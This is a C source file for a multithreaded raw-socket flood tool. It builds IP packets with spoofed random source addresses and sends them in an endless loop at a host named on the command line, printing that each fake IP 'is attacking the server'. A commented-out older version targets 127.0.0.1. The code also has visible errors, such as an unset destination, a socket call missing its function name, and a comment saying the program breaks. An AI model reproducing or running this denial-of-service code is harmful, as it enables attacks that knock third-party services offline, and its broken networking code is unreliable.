#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <time.h>
#include <sys/time.h>
#include <pthread.h>
#include <netdb.h>
#include <arpa/inet.h>

#define Max_Thread 2
static unsigned long dest = 0;
static int socketID;
long long timet=0;
//static unsigned long in = 0;

static inline long randomIP(int begin,int end)
{
    int gap = end - begin + 1;
    int ret = 0;
    srand((unsigned) time(0));
    ret = rand()%gap + begin;
//in++;
    return ret;
}

unsigned short cksum(unsigned short *ptr, int nbytes)
{

    register long sum;
    unsigned short odd;
    register short ans;

    sum = 0;
    while (nbytes>1)
    {
        sum+= *ptr++;
        nbytes -=2;
    }

    if (1 == nbytes)
    {
        odd = 0;
        *((u_char*)&odd) = *(u_char*)ptr;
        sum+=odd;
    }

    sum = (sum>>16) + (sum &0xffff);
    sum+= (sum>>16);
    ans = (short)~sum;
    return ans;
}


static void attack_code()
{
    char data[1024*4], source_ip[32];

//	int socketID = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    struct iphdr *iph = (struct iphdr*) data;
    struct sockaddr_in sin;

    unsigned int ramip = (unsigned int) randomIP(0, 65535);
    sin.sin_family = AF_INET;

    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->id = htons(getpid());
    iph->frag_off= 0;
    iph->ttl = 0x0;
    iph->protocol = -1;
    iph->check = cksum((unsigned short*) data, iph->tot_len>>1);
    iph->saddr = ramip; //inet_addr("20.20.20.20");
    iph->daddr = dest; //inet_addr("127.0.0.1");

    struct in_addr ad;
    memcpy(&ad, &ramip, 4);
    //printf("attakcing\n");
    timet++;
    printf("%d, ip %s is attacking the server\n",ramip, inet_ntoa(ad));

    if(timet==100000) exit(0); // THE CURRENT PROGRAMME VREAK FOR THIS LINE

    sendto(socketID, data, iph->tot_len, 0, (struct sockaddr*) &sin, sizeof(sin));

}

static void *attack_loop()
{
    while(1)
        attack_code();
}

int main(int argc, char* argv[])
{

    struct hostent* host = NULL;
    pthread_t pthread[Max_Thread];

    if (argc < 2 )
    {
        printf("error parm < 2\n");
        return -1;
    }

    if (dest == INADDR_NONE)
    {
        host = gethostbyname(argv[1]);
        if (NULL == host)
        {
            printf ( " error to get host\n");
            return -1;
        }

        memcpy((char*)&dest, host->h_addr_list[0], host->h_length);
    }

    socketID = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (socketID < 0 ) socketID = (AF_INET, SOCK_RAW, IPPROTO_TCP);

    setsockopt(socketID, SOL_IP,IP_HDRINCL, "1", sizeof("1"));

    for (int i = 0 ; i < Max_Thread ; i++)
        pthread_create(&pthread[i], NULL, attack_loop, NULL);
    for (int i = 0 ; i < Max_Thread; i++)
        pthread_join(pthread[i], NULL);

    close(socketID);
    return 0;
}




/*
int main(int argc, char* argv[]){

	char data[1024*4], source_ip[32];

	int socketID = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	struct iphdr *iph = (struct iphdr*) data;
	struct sockaddr_in sin;

	if (argc < 0 ) {printf("error parm < 2\n"); return -1;}

	sin.sin_family = AF_INET;

	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iph->id = htons(getpid());
	iph->frag_off= 0;
	iph->ttl = 0x0;
	iph->protocol = -1;
	iph->check = cksum((unsigned short*) data, iph->tot_len>>1);
	iph->saddr = (unsigned int) randomIP(0, 65535);//inet_addr("20.20.20.20");
	iph->daddr = inet_addr("127.0.0.1");


	printf("attacking...\n");

	int one = 1;
	const int *val = &one ;
	if (setsockopt(socketID, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))< 0) {
		printf("error when set socket\n"); return -1;}

	sendto(socketID, data, iph->tot_len, 0, (struct sockaddr*) &sin, sizeof(sin));
	return 0;
}
*/





















